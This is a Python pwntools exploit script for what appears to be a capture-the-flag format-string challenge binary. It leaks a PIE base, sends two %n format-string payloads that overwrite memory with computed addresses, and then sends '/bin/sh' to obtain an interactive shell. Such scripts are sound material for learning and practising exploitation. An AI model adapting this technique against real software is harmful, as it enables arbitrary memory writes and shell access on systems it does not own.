from pwn import *

import time

target = process("./chall-test_fmtString-7-x86")
gdb.attach(target)

def getOverflowInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	x += 1
	return x

def get0fInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	return x

def getIntSizeBytes(x):
	if x == 0:
		return 0

	byteSize = 0
	while x != 0:
		x = (x >> 8)
		byteSize += 1
	return byteSize

def getWriteSize(writeValue, writtenValue):
	if writeValue > writtenValue:
		valuePrinted = writeValue - writtenValue
		return valuePrinted

	else:
		writeSize = getIntSizeBytes(writeValue)
		overflowInt = getOverflowInt(writeSize)
		andInt = get0fInt(writeSize)

		alreadyWritten = (writtenValue & andInt)
		reachOverflow = overflowInt - alreadyWritten

		valuePrinted = reachOverflow + writeValue 
		return valuePrinted

target.recvuntil("Cancelled out and rendered obsolute: ")
leak = int(target.recvline().strip("\n"), 16)
pieBase = leak - (4684)
print("PieBase is: %s" % hex(pieBase))
value = 0x124c + pieBase
address = 0x3324 + pieBase

address0 = p32(address)
address1 = p32(address + 1)
address2 = p32(address + 2)

value0 = (value & 0xff)
value1 = ((value & 0xff00) >> 8)
value2 = ((value & 0xffff0000) >> 16)

bytesWritten = 0x0
beginString = ""

bytesWritten += (0xc + 0x0)

write0 = getWriteSize(value0, bytesWritten)

bytesWritten += write0
write1 = getWriteSize(value1, bytesWritten)

bytesWritten += write1
write2 = getWriteSize(value2, bytesWritten)

print0 = "%{bytes}x".format(bytes = write0)
print1 = "%{bytes}x".format(bytes = write1)
print2 = "%{bytes}x".format(bytes = write2)

fmt0 = "%7$n"
fmt1 = "%8$n"
fmt2 = "%9$n"

payload = beginString
payload += address0
payload += address1
payload += address2

payload += print0
payload += fmt0

payload += print1
payload += fmt1

payload += print2
payload += fmt2

target.sendline(payload)

target.recv(1)


value = 0x10b0 + pieBase
address = 0x3330 + pieBase

address0 = p32(address)
address1 = p32(address + 1)
address2 = p32(address + 2)

value0 = (value & 0xff)
value1 = ((value & 0xff00) >> 8)
value2 = ((value & 0xffff0000) >> 16)

bytesWritten = 0x0
beginString = ""

bytesWritten += (0xc + 0x0)

write0 = getWriteSize(value0, bytesWritten)

bytesWritten += write0
write1 = getWriteSize(value1, bytesWritten)

bytesWritten += write1
write2 = getWriteSize(value2, bytesWritten)

print0 = "%{bytes}x".format(bytes = write0)
print1 = "%{bytes}x".format(bytes = write1)
print2 = "%{bytes}x".format(bytes = write2)

fmt0 = "%7$n"
fmt1 = "%8$n"
fmt2 = "%9$n"

payload = beginString
payload += address0
payload += address1
payload += address2

payload += print0
payload += fmt0

payload += print1
payload += fmt1

payload += print2
payload += fmt2

target.sendline(payload)

target.recv(1)


target.interactive()

target.sendline("/bin/sh\x00")



target.interactive()



target.interactive()
